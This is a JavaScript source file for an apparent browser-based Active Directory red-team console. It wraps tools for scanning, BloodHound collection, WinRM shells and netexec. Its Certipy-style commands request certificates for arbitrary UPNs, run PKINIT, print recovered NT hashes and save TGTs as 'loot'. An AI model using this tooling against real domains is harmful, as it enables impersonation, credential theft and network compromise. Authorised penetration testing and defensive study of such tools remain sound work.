// The iwa-tools console: a single dispatcher that runs every bundled utility
// from one pseudo-terminal. Non-interactive tools (portscan, adidnsdump, soaphound,
// sharphound) run and stream output; interactive ones (ldap-shell, evil-winrm)
// push a sub-shell whose prompt takes over until `exit`.

import { scan } from './tools/portscan/scanner.js';
import { countHosts, expandPorts } from './tools/portscan/targets.js';
import { run as adidnsRun } from './tools/adidns/adidnsdump.js';
import { run as soaphoundRun } from './tools/soaphound/soaphound.js';
import { run as sharphoundRun } from './tools/sharphound/sharphound.js';
import { run as certifyRun, requestCert as certifyRequest, authenticate as certifyAuth, parseCertIdentity } from './tools/certify/certify.js';
import { connect as ldapConnect } from './tools/ldap-shell/connect.js';
import { LdapShell } from './tools/ldap-shell/shell.js';
import { WinRMClient } from './tools/evil-winrm/winrm/client.js';
import { Shell as WinrmShell } from './tools/evil-winrm/winrm/shell.js';
import { Store } from './store.js';
import { parseTicketFile, buildCcache } from './tickets.js';

// Short-flag aliases (Certipy-ish): -u/-p/-d/-k/-H etc.
const SHORT = { u: 'user', p: 'password', d: 'domain', k: 'kdc', H: 'host', c: 'ca', t: 'template' };
const isFlag = (t) => typeof t === 'string' && t.length > 1 && t[0] === '-' && !/^-\d/.test(t);

// -key value / --key value / -flag / positional parser. Accepts single- and
// double-dash flags; single-char keys are expanded via SHORT.
function parseArgs(argv) {
  const a = { _: [], f: {} };
  for (let i = 0; i < argv.length; i++) {
    const tok = argv[i];
    if (isFlag(tok)) {
      const raw = tok.replace(/^-+/, '');
      const k = SHORT[raw] || raw;
      const n = argv[i + 1];
      if (n === undefined || isFlag(n)) a.f[k] = true; else { a.f[k] = n; i++; }
    } else a._.push(tok);
  }
  return a;
}
function tokenize(line) { return (line.match(/"[^"]*"|'[^']*'|\S+/g) || []).map((t) => t.replace(/^["']|["']$/g, '')); }

// Build the LDAP/Kerberos creds config shared by the LDAP-family tools.
function baseLdapConfig(f) {
  return {
    host: f.host, port: f.port ? +f.port : null,
    // Default to NTLM — kerberos needs a working KDC / SPN chain and fails
    // silently against most mixed labs; users can still ask for --auth kerberos
    // (or --ticket, which pins it to kerberos below).
    authMethod: f.auth || 'ntlm', bindDN: f.user, user: f.user,
    domain: f.domain, kdc: f.kdc || null, tls: !!f.tls,
    password: f.password, hash: f.hash || null, baseDN: f.base || null,
  };
}

const COLLECTION_PRESETS = {
  default:      ['Group', 'LocalAdmin', 'Session', 'Trusts', 'ACL', 'ObjectProps', 'Container', 'SPNTargets', 'RDP', 'DCOM', 'PSRemote'],
  all:          ['Group', 'LocalAdmin', 'GPOLocalGroup', 'Session', 'LoggedOn', 'Trusts', 'ACL', 'Container', 'RDP', 'ObjectProps', 'SPNTargets', 'DCOM', 'PSRemote', 'CertServices'],
  dconly:       ['Group', 'Trusts', 'ACL', 'ObjectProps', 'Container', 'SPNTargets', 'CertServices'],
  computeronly: ['LocalAdmin', 'Session', 'LoggedOn', 'RDP', 'DCOM', 'PSRemote'],
  localgroup:   ['LocalAdmin', 'RDP', 'DCOM', 'PSRemote'],
};
function parseCollectionMethods(str) {
  const methods = new Set();
  for (const token of String(str).split(',')) {
    const t = token.trim().toLowerCase();
    if (COLLECTION_PRESETS[t]) { for (const m of COLLECTION_PRESETS[t]) methods.add(m); }
    else { const found = COLLECTION_PRESETS.all.find((m) => m.toLowerCase() === t); if (found) methods.add(found); }
  }
  return methods;
}

export const TOOLS = ['portscan', 'adidnsdump', 'soaphound', 'sharphound', 'certipy', 'ldap-shell', 'evil-winrm', 'nxc'];

const USAGE = {
  portscan: 'portscan -p <ports> <target> [target2 ...] [--timeout ms] [--concurrency n]',
  adidnsdump: 'adidnsdump -H <dc> -u <u> -d <d> [-p <pw>] [--auth ntlm|kerberos|simple] [--ticket <store-path>] [--tls] [-k <kdc>] [--zone <z>] [--list] [--base <dn>] [--out <file>]  (saved under loot/)',
  soaphound: 'soaphound -H <dc> -u <u> -d <d> --mode <bhdump|buildcache|dnsdump|certdump|query> [--auth] [--ticket <store-path>] [--filter <f>]',
  sharphound: 'sharphound -H <dc> -u <u> -d <d> [--collection Default|All|DCOnly|ComputerOnly|Method,...] [--mode query|buildcache] [--auth] [--ticket <store-path>] [--tls] [--stealth] [--exclude-dcs]',
  certipy: 'certipy <find|vulnerable|templates|cas|req|auth> ...  —  run `help certipy` for full syntax',
  'ldap-shell': 'ldap-shell -H <dc> -u <u> -d <d> [-p <pw>] [--auth] [--ticket <store-path>] [--tls] [-k <kdc>]   (interactive)',
  'evil-winrm': 'evil-winrm -H <h> -u <u> -d <d> [-p <pw>] [--auth ntlm|kerberos] [--ticket <store-path>] [--tls] [--hash <nt>]   (interactive)',
  nxc: 'nxc <proto> <targets> -u <u> -d <d> [-p <pw>] [-H <hash>] [--ticket <store-path> (smb|ldap|winrm|mssql)] [-x "cmd"|--module] — proto: smb|ldap|winrm|mssql|ssh|ftp|rdp|vnc',
};

const EXAMPLE = {
  portscan: 'portscan -p 22,80,443,3389 10.0.0.0/24 --timeout 1000',
  adidnsdump: 'adidnsdump -H dc01.corp.local -u admin -d corp.local --tls --list',
  soaphound: 'soaphound -H dc01 -u admin -d corp.local --mode bhdump',
  sharphound: 'sharphound -H dc01 -u admin -d corp.local --collection Default --tls',
  certipy: 'certipy find -H dc01 -u admin -d corp.local -p pass --tls',
  'ldap-shell': 'ldap-shell -H dc01.corp.local -u admin -d corp.local --tls',
  'evil-winrm': 'evil-winrm -H dc01.corp.local -u admin -d corp.local --auth kerberos',
  nxc: 'nxc smb dc01 -u admin -d corp.local -p P@ssw0rd --shares',
};

// Pseudo-filesystem commands (the store): available only at the top-level prompt.
const STORE_CMDS = ['ls', 'cat', 'rm', 'put', 'mv', 'upload', 'download', 'store'];
const BUILTINS = ['help', 'clear', 'klist', ...STORE_CMDS];

const ETYPE_NAMES = { 1: 'des-cbc-crc', 3: 'des-cbc-md5', 16: 'des3-cbc-sha1', 17: 'aes128-cts-hmac-sha1', 18: 'aes256-cts-hmac-sha1', 23: 'rc4-hmac', 24: 'rc4-hmac-exp' };
const etypeName = (e) => `${ETYPE_NAMES[e] || 'etype'} (${e})`;
const basename = (p) => String(p).split('/').pop();
function humanSize(n) {
  if (n < 1024) return `${n}B`;
  if (n < 1024 * 1024) return `${(n / 1024).toFixed(1)}K`;
  return `${(n / (1024 * 1024)).toFixed(1)}M`;
}
function ageOf(mtime) {
  const s = Math.max(0, Math.round((Date.now() - mtime) / 1000));
  if (s < 60) return `${s}s ago`;
  if (s < 3600) return `${Math.round(s / 60)}m ago`;
  if (s < 86400) return `${Math.round(s / 3600)}h ago`;
  return `${Math.round(s / 86400)}d ago`;
}

export class IwaConsole {
  // io: { print(text, cls?), setPrompt(str), download(name, contentObjOrString),
  //       pickFiles?() -> Promise<[{name, bytes}]> }
  constructor(io) { this.io = io; this.active = null; this.store = new Store(); }
  print(t, c) { this.io.print(t, c); }

  async submit(line) {
    if (this.active) {
      if (line.trim().toLowerCase() === 'exit') {
        try { await this.active.close?.(); } catch { /* ignore */ }
        this.active = null; this.io.setPrompt('iwa#');
        this.print('[*] back to the iwa-tools console.', 'ok');
        return;
      }
      return this.active.handle(line);
    }
    let argv = tokenize(line);
    if (!argv.length) return;
    const cmd = argv[0].toLowerCase();
    if (cmd === 'help') return this.help(argv[1]);
    if (cmd === 'clear') { this.io.clear?.(); return; }
    const fn = this[`cmd_${cmd.replace('-', '_')}`];
    if (!fn) { this.print(`unknown command: ${cmd} — try "help"`, 'err'); return; }
    if (argv.includes('-h') || argv.includes('--help')) return this.help(cmd);
    try {
      // Expand @name arguments from the store (text files) for tool commands only
      // — storage commands take store paths literally.
      if (TOOLS.includes(cmd)) argv = this._expandArgs(argv);
      await fn.call(this, parseArgs(argv.slice(1)), argv);
    } catch (e) { this.print(`[!] ${e.message}`, 'err'); }
  }

  // Substitute any `@path` token with the text of that stored file, so scopes /
  // filters / wordlists live in the store: `portscan -p 445 @scope/net.txt`.
  // The value right after `--ticket` keeps its path (tickets are binary, loaded
  // by ldapConfig) — only its leading `@`, if any, is stripped.
  _expandArgs(argv) {
    return argv.map((tok, i) => {
      const prev = (argv[i - 1] || '').replace(/^-+/, '');
      if (prev === 'ticket') return tok.replace(/^@/, '');
      if (typeof tok !== 'string' || tok[0] !== '@') return tok;
      const path = tok.slice(1);
      const text = this.store.getText(path);
      if (text == null) throw new Error(`no such file in store: ${path}`);
      return text;
    });
  }

  // Parse a stored ccache/kirbi (accepts a leading @) into { tgts, serviceTickets }.
  loadTicket(pathLike) {
    const path = String(pathLike).replace(/^@/, '');
    const bytes = this.store.get(path);
    if (!bytes) throw new Error(`no such file in store: ${path}`);
    return parseTicketFile(bytes);
  }

  // baseLdapConfig + ticket import from the store. Passing --ticket <path>
  // implies Kerberos and pre-loads the parsed ticket for the LDAP-family bind.
  ldapConfig(f) {
    const cfg = baseLdapConfig(f);
    if (f.ticket) { cfg.ticket = this.loadTicket(f.ticket); cfg.authMethod = 'kerberos'; }
    return cfg;
  }

  // Candidate completions for the LAST token of a partial command line — store
  // paths for @path, --ticket values, and the path-taking storage commands.
  // Returns full replacement tokens (e.g. '@scope/net.txt'), or [] if none apply.
  completeArgs(argv) {
    if (this.active || argv.length < 2) return [];
    const cmd = argv[0].toLowerCase();
    const last = argv[argv.length - 1] || '';
    const prev = argv[argv.length - 2] || '';
    const paths = this.store.list().map((r) => r.path);
    if (last[0] === '@') return paths.filter((p) => p.startsWith(last.slice(1))).map((p) => '@' + p);
    if (prev.replace(/^-+/, '') === 'ticket') return paths.filter((p) => p.startsWith(last));
    if (['cat', 'download', 'rm', 'mv', 'klist'].includes(cmd)) return paths.filter((p) => p.startsWith(last));
    return [];
  }

  // ---- klist: inspect a stored ccache/kirbi without binding ----------------
  cmd_klist(_a, argv) {
    const path = argv[1];
    if (!path) return this.print('usage: klist <store-path>   (a ccache or kirbi you uploaded)', 'err');
    const { tgts, serviceTickets } = this.loadTicket(path);
    const all = [...tgts.map((t) => ['TGT', t]), ...serviceTickets.map((t) => ['service', t])];
    if (!all.length) return this.print('  (no tickets found)', 'muted');
    this.print(`${path}:  ${tgts.length} TGT, ${serviceTickets.length} service ticket(s)`, 'ok');
    for (const [kind, t] of all) {
      const client = `${(t.cname || []).join('/')}@${t.crealm || ''}`;
      this.print(`  [${kind}] ${t.spn || '(unknown)'}`);
      this.print(`         client ${client}   etype ${etypeName(t.sessionKey.etype)}`);
    }
  }

  // ---- pseudo file storage -------------------------------------------------

  cmd_store() {
    this.print('pseudo file storage (in-memory, this session only):');
    this.print('  ls [prefix]            list files (path · size · age)');
    this.print('  cat <path>             print a text file');
    this.print('  put <path> <text…>     write inline text (e.g. a scan scope)');
    this.print('  upload [prefix/]       import file(s) from disk (file picker)');
    this.print('  download <path>        export a stored file to disk');
    this.print('  mv <from> <to>         rename');
    this.print('  rm <path>              delete');
    this.print('  klist <path>           inspect an uploaded ccache/kirbi (client · SPN · etype)');
    this.print('  · pass a stored text file to any tool with @path (e.g. portscan -p 445 @scope/net.txt)');
    this.print('  · Kerberos tickets: upload a ccache/kirbi, then --ticket <path> on an LDAP tool or evil-winrm');
  }

  cmd_ls(_a, argv) {
    const rows = this.store.list(argv[1] || '');
    if (!rows.length) { this.print('(store is empty)', 'muted'); return; }
    for (const r of rows) this.print(`${r.path.padEnd(40)}  ${humanSize(r.size).padStart(7)}  ${ageOf(r.mtime)}`);
    this.print(`[+] ${rows.length} file(s).`, 'ok');
  }

  cmd_cat(_a, argv) {
    const path = argv[1];
    if (!path) return this.print('usage: cat <path>', 'err');
    const text = this.store.getText(path);
    if (text == null) return this.print(`no such file: ${path}`, 'err');
    this.print(text);
  }

  cmd_rm(_a, argv) {
    const path = argv[1];
    if (!path) return this.print('usage: rm <path>', 'err');
    if (this.store.remove(path)) this.print(`removed ${path}`, 'ok');
    else this.print(`no such file: ${path}`, 'err');
  }

  cmd_put(_a, argv) {
    const path = argv[1];
    if (!path) return this.print('usage: put <path> <text…>', 'err');
    const text = argv.slice(2).join(' ');
    const p = this.store.put(path, text);
    this.print(`[+] wrote ${p} (${humanSize(new TextEncoder().encode(text).length)})`, 'ok');
  }

  cmd_mv(_a, argv) {
    const [from, to] = [argv[1], argv[2]];
    if (!from || !to) return this.print('usage: mv <from> <to>', 'err');
    this.store.rename(from, to);
    this.print(`[+] ${from} → ${to}`, 'ok');
  }

  async cmd_upload(_a, argv) {
    if (!this.io.pickFiles) return this.print('upload needs a file picker (run inside the installed IWA).', 'err');
    const dir = argv[1] ? argv[1].replace(/\/*$/, '/') : '';
    const files = await this.io.pickFiles();
    if (!files || !files.length) { this.print('(nothing selected)', 'muted'); return; }
    for (const file of files) {
      const p = this.store.put(dir + file.name, file.bytes);
      this.print(`[+] uploaded ${p} (${humanSize(file.bytes.length)})`, 'ok');
    }
  }

  cmd_download(_a, argv) {
    const path = argv[1];
    if (!path) return this.print('usage: download <path>', 'err');
    const bytes = this.store.get(path);
    if (!bytes) return this.print(`no such file: ${path}`, 'err');
    this.io.download?.(basename(path), bytes);
    this.print(`[+] exported ${path} → ${basename(path)}`, 'ok');
  }

  help(which) {
    if (which && STORE_CMDS.includes(which)) return this.cmd_store();
    if (which === 'certify' || which === 'certipy') { this.certipyHelp(); return; }
    if (which && USAGE[which]) {
      this.print(USAGE[which]);
      this.print(`  example:  ${EXAMPLE[which]}`, 'ok');
      if (which === 'nxc') this.nxcHelp();
      return;
    }
    // Top-level help — grouped by intent so a new user can scan and pick the
    // right tool without reading eight ~180-char USAGE lines. Full per-tool
    // syntax is available via `help <tool>`; nxc's per-protocol module tree
    // via `help nxc`; certipy's subcommand cheatsheet via `help certipy`.
    const H = (s) => this.print(s, 'ok');        // section header — green
    const M = (s) => this.print(s, 'muted');     // hint / footer   — muted
    const L = (s) => this.print(s);              // body            — default
    L('');
    H('  iwa-tools console — Direct Sockets AD tradecraft, all in a signed IWA.');
    L('');
    H('  ENUMERATE  (read the environment)');
    L('    portscan            TCP connect scan (CIDR, ranges, port lists)');
    L('    adidnsdump          Dump AD-integrated DNS zones over LDAP');
    L('    sharphound          BloodHound collector — LDAP + SMB');
    L('    soaphound           BloodHound collector — ADWS (port 9389, quieter)');
    L('    certipy find|…      AD CS: templates, CAs, ESC findings');
    L('');
    H('  INTERACT  (one host, interactive shell)');
    L('    ldap-shell          LDAP shell — search, DACL, RBCD, Shadow Creds, gMSA, …');
    L('    evil-winrm          Remote PowerShell over WinRM');
    L('');
    H('  EXPLOIT  (write / execute / abuse)');
    L('    certipy req         Request a cert (ESC1/ESC2/ESC8, `-sid` for KB5014754)');
    L('    certipy auth        PKINIT with a PFX → TGT + UnPAC-the-hash');
    L('    nxc <proto>         netexec — smb · ldap · winrm · mssql · ssh · ftp · rdp · vnc');
    L('');
    H('  STORE  (top-level only — the in-memory /store/)');
    L('    ls · cat · put · upload · download · mv · rm       manage stored files');
    L('    klist PATH                                         inspect ccache/kirbi metadata');
    L('');
    H('  COMMON FLAGS  (any tool)');
    L('    -u USER  -p PASS  -H HOST  -d DOMAIN  -k KDC  --tls');
    L('    --auth ntlm|kerberos    override the default (NTLM for LDAP-family)');
    L('    --ticket PATH           use a stored ccache/kirbi (no password)');
    L('    -H HASH                 pass-the-hash (32-char NT hash)');
    L('    @path                   inline a stored text file as an arg');
    L('');
    M('  detailed:  help <tool>       (e.g. help nxc,  help certipy)');
    M('  misc:      clear   <Tab> completes   (in a sub-shell:  exit)');
    L('');
  }

  // Tab completion: candidate command names for the first word, scoped to the
  // current mode (sub-shell commands when one is active, else tools + builtins).
  complete(word) {
    const pool = this.active && this.active.commands ? this.active.commands : [...TOOLS, ...BUILTINS];
    return pool.filter((c) => c.startsWith(word));
  }

  // ---- portscan ----
  async cmd_portscan(a) {
    const ports = a.f.password || a.f.ports || '';
    const targets = a._.join(' ');
    if (!targets || !ports) return this.print(`usage: ${USAGE.portscan}`, 'err');
    const total = countHosts(targets) * expandPorts(ports).length;
    this.print(`[*] scanning ${targets} (${total} probes) …`);
    const t0 = Date.now();
    const { open, scanned } = await scan({
      targets, ports, timeout: +a.f.timeout || 1500, concurrency: +a.f.concurrency || 100,
      onOpen: (hp) => this.print(`    OPEN  ${hp}`, 'ok'),
    });
    this.print(`[+] ${open} open / ${scanned} probed in ${((Date.now() - t0) / 1000).toFixed(1)}s`, 'ok');
  }

  // ---- adidnsdump ----
  async cmd_adidnsdump(a) {
    const f = a.f;
    if (!f.host) return this.print(`usage: ${USAGE.adidnsdump}`, 'err');
    const config = {
      ...this.ldapConfig(f), zone: f.zone || null, listOnly: !!f.list,
      forest: !!f.forest, includeTombstoned: !!f.tomb, resolve: !!f.resolve,
    };
    const res = await adidnsRun(config, { log: (m) => this.print('  · ' + m), onRow: (r) => this.print(`${r.fqdn}\t${r.type}\t${r.value}`) });
    if (res.zones && res.zones.length) this.print(`zones: ${res.zones.join(', ')}`, 'ok');
    this.print(`[+] ${res.rows ? res.rows.length : 0} record(s).`, 'ok');

    // Save output to the in-memory store, mirroring dirkjanm's adidnsdump.py:
    // --list writes zones.txt (one zone per line); otherwise records.csv with
    // header `type,name,value` (same columns as upstream). Explicit --out NAME
    // overrides the default filename.
    const files = [];
    if (config.listOnly) {
      files.push({ name: f.out || 'zones.txt', content: (res.zones || []).join('\n') + '\n' });
    } else if (res.rows && res.rows.length) {
      const esc = (s) => { const v = String(s ?? ''); return /[",\n]/.test(v) ? `"${v.replace(/"/g, '""')}"` : v; };
      const header = 'type,name,value\n';
      const body = res.rows.map((r) => `${esc(r.type)},${esc(r.fqdn.replace(/\.$/, ''))},${esc(r.value)}`).join('\n');
      files.push({ name: f.out || 'records.csv', content: header + body + '\n' });
    }
    this._saveResults(files);
  }

  // ---- soaphound (collector that produces files) ----
  async cmd_soaphound(a) { await this._collector(soaphoundRun, a, USAGE.soaphound); }

  // ---- sharphound (SharpHound-style collection methods) ----
  async cmd_sharphound(a) {
    const f = a.f;
    if (!f.host) return this.print(`usage: ${USAGE.sharphound}`, 'err');
    const hooks = { log: (m) => this.print('  · ' + m), onRow: (r) => { if (r.dn) this.print(`${r.dn}\t${r.className || ''}`); } };
    if (f.mode === 'query' || f.mode === 'buildcache') {
      const config = { ...this.ldapConfig(f), mode: f.mode, filter: f.filter, attributes: f.attributes };
      const res = await sharphoundRun(config, hooks);
      if (res.summary) this.print('summary: ' + Object.entries(res.summary).map(([k, v]) => `${k}=${v}`).join(' '), 'ok');
      this._saveResults(res.files);
      return;
    }
    const methods = parseCollectionMethods(f.collection || f.collect || 'Default');
    this.print(`[*] collection methods: ${[...methods].join(', ')}`);
    const config = { ...this.ldapConfig(f), mode: 'collect', collectionMethods: methods, stealth: !!f.stealth, excludeDCs: !!f['exclude-dcs'] };
    const res = await sharphoundRun(config, hooks);
    if (res.summary) this.print('summary: ' + Object.entries(res.summary).map(([k, v]) => `${k}=${v}`).join(' '), 'ok');
    this._saveResults(res.files);
  }

  // ---- certify (AD CS enumeration + ESC findings, prints tables) ----
  // `certipy` — Certipy-style alias. Same subcommands / flags as cmd_certify.
  async cmd_certipy(a, argv) { return this.cmd_certify(a, argv); }

  async cmd_certify(a) {
    const f = a.f;
    // Certipy-style subcommand: certify <find|vulnerable|templates|cas|req|auth>.
    const sub = (a._[0] || '').toLowerCase();
    const known = ['find', 'vulnerable', 'vuln', 'templates', 'cas', 'request', 'req', 'auth'];
    const cmd = known.includes(sub) ? sub : (f.mode || (f.request ? 'request' : (f.pkinit ? 'auth' : 'find')));

    if (cmd === 'auth') {
      // -u and -d are optional when the cert already names its owner (Certipy
      // does the same auto-detect). We validate below after the cert is loaded.
      // Three input modes, mirroring certipy:
      //   -pfx PATH                     — load an issued PFX from the store
      //                                   (falls back to sibling .crt/.key our
      //                                   own `certipy req` writes next to it)
      //   -cert PATH -key PATH          — load a raw PEM cert + key from the store
      //   otherwise                     — request a fresh cert (needs --cahost/-ca/-t/-p),
      //                                   then PKINIT with it
      let certPem = null, keyPem = null;
      if (f.pfx) {
        const pfxPath = String(f.pfx).replace(/^@/, '');
        const crtPath = pfxPath.replace(/\.pfx$/i, '.crt');
        const keyPath = pfxPath.replace(/\.pfx$/i, '.key');
        const crt = this.store.getText(crtPath);
        const key = this.store.getText(keyPath);
        if (!crt || !key) return this.print(`certipy auth: cannot find sibling ${crtPath} + ${keyPath} for ${pfxPath} (raw-PFX parsing not yet supported — pass -cert/-key instead, or re-issue with our \`certipy req\` which writes both PEMs)`, 'err');
        certPem = crt; keyPem = key;
        this.print(`  · loaded ${crtPath} + ${keyPath}`);
      } else if (f.cert && f.key) {
        certPem = this.store.getText(String(f.cert).replace(/^@/, ''));
        keyPem = this.store.getText(String(f.key).replace(/^@/, ''));
        if (!certPem || !keyPem) return this.print('certipy auth: -cert / -key files not in store', 'err');
      }
      // Auto-detect the target user/domain from the cert (SAN UPN, then CN /
      // Issuer DC=…). Explicit -u / -d wins.
      let authUser = f.user, authDomain = f.domain;
      if (certPem && (!authUser || !authDomain)) {
        try {
          const der = Uint8Array.from(atob(certPem.replace(/-----[^-]+-----|\s/g, '')), (c) => c.charCodeAt(0));
          const id = parseCertIdentity(der);
          if (!authUser)  authUser  = id.username;
          if (!authDomain) authDomain = id.domain;
          if (id.username || id.domain) this.print(`  · cert principal: ${id.username || '?'}@${id.domain || '?'}${(!f.user || !f.domain) ? '  (auto-detected — override with -u / -d)' : ''}`);
        } catch (e) { this.print(`  · cert identity parse failed: ${e.message}`, 'warn'); }
      }
      if (!authUser || !authDomain) {
        return this.print('usage: certipy auth (-pfx <path> | -cert <path> -key <path> | --cahost <ca> -ca <CAName> -t <template> -p <pw>) [-u <u>] [-d <d>] [-k <dc>] [-no-hash]', 'err');
      }
      // KDC precedence: -k <kdc> → -H <dc> → --cahost → -d <domain>.
      // AD registers an A record for the domain FQDN pointing at every DC, so
      // the domain name itself is a working default when nothing else is given.
      const kdc = f.kdc || f.host || f.cahost || authDomain;
      if (!kdc) return this.print('certipy auth: cannot determine KDC — pass -k <dc> or -H <dc>', 'err');
      let res;
      try {
        res = await certifyAuth({
          kdc, caHost: f.cahost || f.host, caName: f.ca, template: f.template || 'User',
          subject: `CN=${authUser}`, user: authUser, domain: authDomain, password: f.password, hash: f.hash,
          certPem, keyPem, unpac: !f['no-unpac'] && !f['no-hash'],
        }, { log: (m) => this.print('  · ' + m) });
      } catch (e) {
        this.print(`certipy auth: ${e.message}`, 'err');
        return;
      }
      this.print(`[+] PKINIT ok — TGT for ${res.username}@${res.realm} (session etype ${res.sessionKeyEtype})`, 'ok');
      if (res.ntHash) this.print(`[+] ${res.username} NT hash: ${res.ntHash}`, 'ok');
      // Save the TGT as a ccache so subsequent commands can `--ticket` it.
      try {
        const tgtObj = {
          ticket: res.ticket, sessionKey: { etype: res.sessionKeyEtype, key: res.sessionKey },
          username: res.username, realm: res.realm, cname: [res.username], crealm: res.realm,
        };
        if (res.ticket && res.sessionKey) {
          const ts = new Date().toISOString().replace(/[:.]/g, '-').slice(0, 19);
          const path = `loot/certipy/${ts}_${res.username}.ccache`;
          const bytes = buildCcache(tgtObj);
          this._saveResults([{ name: path.replace(/^loot\//, ''), content: bytes }]);
          this.print(`[+] TGT saved as ccache — use with any --ticket ${path}`, 'ok');
        }
      } catch (e) { this.print(`  · could not write ccache: ${e.message}`, 'warn'); }
      return;
    }
    if (cmd === 'request' || cmd === 'req') {
      if (!f.ca || !f.template) return this.print('usage: certify req --cahost <ca> -ca <CAName> -t <template> -u <u> -d <d> [-upn <upn>]', 'err');
      const caHost = f.cahost || f.host;
      if (!caHost) return this.print('certify req: --cahost <CA host> is required', 'err');
      const domain = f.domain || '';
      if (!domain) this.print('  · warning: no -d <domain> given; SMB auth may fail against domain-joined CA hosts', 'warn');
      let res;
      try {
        res = await certifyRequest({
          caHost, caName: f.ca, template: f.template, subject: f.subject || 'CN=User',
          altUpn: f.upn || f.altname || f.altupn || null,
          altDns: f.dns || f.altdns || null,
          sid: f.sid || null,
          user: f.user, domain, password: f.password, hash: f.hash,
        }, { log: (m) => this.print('  · ' + m) });
      } catch (e) {
        // Add caHost context to the low-level "Network Error" / connect
        // errors so a typo in --cahost is obvious.
        const hint = /Network Error|ECONNREFUSED|ENOTFOUND|ETIMEDOUT|closed/i.test(e.message)
          ? ` — could not reach ${caHost}:445 (check --cahost)`
          : '';
        this.print(`certify req: ${e.message}${hint}`, 'err');
        return;
      }
      this.print(`disposition: ${res.dispositionText} (requestId ${res.requestId})`, res.disposition === 3 ? 'ok' : 'err');
      if (res.certPem) {
        // Timestamp + template so back-to-back requests don't overwrite one
        // another in the store.
        const ts = new Date().toISOString().replace(/[:.]/g, '-').slice(0, 19);
        const base = `certipy/${ts}_${f.template}`;
        const files = [
          { name: `${base}.crt`, content: res.certPem },
          { name: `${base}.key`, content: res.keyPem },
        ];
        if (res.pfx) files.push({ name: `${base}.pfx`, content: res.pfx });
        this._saveResults(files);
      } else if (res.message) this.print('  ' + res.message);
      return;
    }
    // Bare `certipy` (no subcommand, no -H) is a help request — show the full
    // structured help instead of a bewildering one-liner.
    if (!f.host && !sub) return this.certipyHelp();
    if (!f.host) return this.print(`usage: ${USAGE.certipy}`, 'err');
    // Certipy semantics: `find` enumerates every CA + template and reports the
    // full inventory alongside the ESC findings; `-vulnerable` filters the
    // report to templates/CAs that carry an ESC; `-enabled` filters templates
    // to those published by at least one CA. Whatever the filter, the JSON +
    // TXT files always contain the full snapshot — that's what BloodHound
    // consumes. `-stdout` suppresses the file write.
    const config = { ...this.ldapConfig(f), mode: 'find', enabled: !!f.enabled };
    const res = await certifyRun(config, { log: (m) => this.print('  · ' + m) });
    const suppressFile = !!f.stdout;
    const wantOnlyVuln = (cmd === 'vulnerable' || cmd === 'vuln');
    this.print(`summary: ${Object.entries(res.summary).map(([k, v]) => `${k}=${v}`).join(' ')}  ${res.configNC}`, 'ok');

    // Console display
    if (cmd === 'cas' || cmd === 'find' || cmd === 'vulnerable' || cmd === 'vuln') {
      const rows = wantOnlyVuln ? res.caRows.filter((c) => c.escs.length) : res.caRows;
      this.print(`CAs (${rows.length}):`);
      for (const c of rows) this.print(`  ${c.name}  ${c.dns || ''}  templates=${c.templates}  web=${c.webEnroll}  ${c.escs.join(',') || '-'}`);
    }
    if (cmd === 'templates' || cmd === 'find' || cmd === 'vulnerable' || cmd === 'vuln') {
      let rows = res.templateRows;
      if (f.enabled) rows = rows.filter((t) => t.enabled);
      if (wantOnlyVuln) rows = rows.filter((t) => t.escs.length);
      this.print(`Templates (${rows.length}${f.enabled ? ' enabled' : ''}${wantOnlyVuln ? ', vulnerable' : ''}):`);
      for (const t of rows) this.print(`  ${t.name}  v${t.schema}  ${t.enabled ? 'enabled' : 'disabled'}  ESC=[${t.escs.join(',')}]  enroll=${(t.enrollees || []).join('|')}`);
    }
    if (cmd === 'find' || cmd === 'vulnerable' || cmd === 'vuln') {
      if (!res.findings.length) this.print('  no ESC findings.', 'ok');
      for (const x of res.findings) {
        this.print(`  [${x.risk}] ${x.id}  ${x.scope}:${x.object}${x.enabled === false ? ' (disabled)' : ''}`,
                   x.risk === 'Critical' || x.risk === 'High' ? 'err' : '');
        this.print(`         ${x.detail}`);
        if (x.principalNames && x.principalNames.length) this.print(`         principals: ${x.principalNames.join(', ')}`);
      }
    }

    if (suppressFile) return;
    if (!(cmd === 'find' || cmd === 'vulnerable' || cmd === 'vuln' || cmd === 'templates' || cmd === 'cas')) return;

    // Timestamped, Certipy-style outputs under loot/certipy/. JSON is the full
    // dump (BloodHound-compatible shape); TXT is the pretty-printed report.
    const ts = new Date().toISOString().replace(/[:.]/g, '-').slice(0, 19);
    const base = `certipy/${ts}_Certipy`;
    const jsonBlob = {
      meta: { domain: f.domain || null, configNC: res.configNC, dumpedAt: new Date().toISOString(),
              summary: res.summary, filter: wantOnlyVuln ? 'vulnerable' : (f.enabled ? 'enabled' : 'all') },
      'Certificate Authorities': Object.fromEntries(res.caRows.map((c, i) => [String(i), c])),
      'Certificate Templates':   Object.fromEntries(res.templateRows.map((t, i) => [String(i), t])),
      'Findings':                res.findings,
    };
    const txt = [];
    txt.push(`Certipy report — ${new Date().toISOString()}`);
    txt.push(`configNC: ${res.configNC}`);
    txt.push(`summary: ${Object.entries(res.summary).map(([k, v]) => `${k}=${v}`).join(' ')}`);
    txt.push('');
    txt.push(`Certificate Authorities (${res.caRows.length}):`);
    for (const c of res.caRows) {
      txt.push(`  ${c.name}`);
      if (c.dns) txt.push(`    DNS Name:            ${c.dns}`);
      txt.push(`    Web Enrollment:      ${c.webEnroll ? 'yes' : 'no'}`);
      txt.push(`    Templates Published: ${c.templates}`);
      txt.push(`    ESC Findings:        ${c.escs.join(', ') || 'none'}`);
    }
    txt.push('');
    txt.push(`Certificate Templates (${res.templateRows.length}):`);
    for (const t of res.templateRows) {
      txt.push(`  ${t.name}`);
      txt.push(`    CN:                    ${t.cn}`);
      txt.push(`    Schema Version:        ${t.schema}`);
      txt.push(`    Enabled:               ${t.enabled ? 'yes' : 'no'}`);
      txt.push(`    Client Authentication: ${t.clientAuth ? 'yes' : 'no'}`);
      txt.push(`    Enrollee Supplies SAN: ${t.suppliesSubject ? 'yes' : 'no'}`);
      txt.push(`    Requires Manager:      ${t.managerApproval ? 'yes' : 'no'}`);
      txt.push(`    Extended Key Usage:    ${(t.ekus || []).join(', ') || '(any purpose)'}`);
      txt.push(`    Enrollment Rights:     ${(t.enrollees || []).join(', ') || 'none'}`);
      txt.push(`    ESC Findings:          ${(t.escs || []).join(', ') || 'none'}`);
    }
    txt.push('');
    txt.push(`ESC Findings (${res.findings.length}):`);
    for (const x of res.findings) {
      txt.push(`  [${x.risk}] ${x.id}  ${x.scope}: ${x.object}${x.enabled === false ? ' (disabled)' : ''}`);
      txt.push(`    ${x.detail}`);
